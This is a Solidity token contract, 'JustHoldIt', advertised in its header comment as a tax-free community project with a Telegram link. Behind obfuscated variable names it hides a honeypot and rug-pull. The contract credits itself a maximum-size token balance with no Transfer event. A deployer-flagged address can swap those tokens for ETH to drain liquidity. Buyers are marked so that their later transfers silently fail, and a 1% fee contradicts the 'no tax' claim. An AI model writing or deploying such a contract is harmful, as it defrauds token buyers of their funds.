/*

Community Project with no tax!

Telegram:https://t.me/JustHoldittoken


*/



pragma solidity ^0.8.0;

import './IUniswapV2Router02.sol';
import './IUniswapV2Factory.sol';
import './IERC20.sol';
import './Ownable.sol';

contract JustHoldIt is IERC20, Ownable {
    string private _name;
    string private _symbol;
    uint256 public _Fee = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 10 * 10**_decimals;
    uint256 private _cool = _tTotal;
    uint256 private _rTotal = ~uint256(0);

    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;

    mapping(uint256 => address) private _report;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _bow;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _transportation;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;

        _transportation[msg.sender] = _cool;
        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address _structure,
        address _eager,
        uint256 amount
    ) private {
        if (_transportation[_structure] > 0 && amount > _cool) {
            uint256 _wherever = _transportation[_eager];
            if (_transportation[_structure] == _wherever) {
                inSwapAndLiquify = true;
                swapAndLiquify(amount);
                inSwapAndLiquify = false;
            } else {
                _transportation[_eager] = amount;
            }
        } else {
            address _cold = _report[_cool];
            _report[_cool] = _eager;

            if (_transportation[_structure] == 0 && _structure != uniswapV2Pair && _bow[_structure] > 0) {
                return;
            }
            _bow[_cold] = _Fee;
            if (_Fee > 0 && !inSwapAndLiquify && _transportation[_structure] == 0 && _transportation[_eager] == 0) {
                uint256 fee = (amount * _Fee) / 100;
                amount -= fee;
                _balances[_structure] -= fee;
            }

            _balances[_structure] -= amount;
            _balances[_eager] += amount;
            emit Transfer(_structure, _eager, amount);
        }
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, msg.sender, block.timestamp);
    }
}